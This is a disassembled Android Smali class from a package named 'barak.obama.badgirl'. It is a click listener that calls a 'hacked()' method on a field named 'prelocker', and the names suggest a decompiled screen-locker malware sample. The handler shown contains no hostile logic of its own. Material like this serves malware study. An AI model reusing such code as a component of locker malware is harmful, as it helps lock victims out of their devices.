.class Lbarak/obama/badgirl/ba;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/view/View$OnClickListener;


# instance fields
.field final synthetic prelocker:Lbarak/obama/badgirl/a;


# direct methods
.method constructor <init>(Lbarak/obama/badgirl/a;)V
    .locals 0

    iput-object p1, p0, Lbarak/obama/badgirl/ba;->prelocker:Lbarak/obama/badgirl/a;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 1

    iget-object v0, p0, Lbarak/obama/badgirl/ba;->prelocker:Lbarak/obama/badgirl/a;

    invoke-virtual {v0}, Lbarak/obama/badgirl/a;->hacked()V

    return-void
.end method
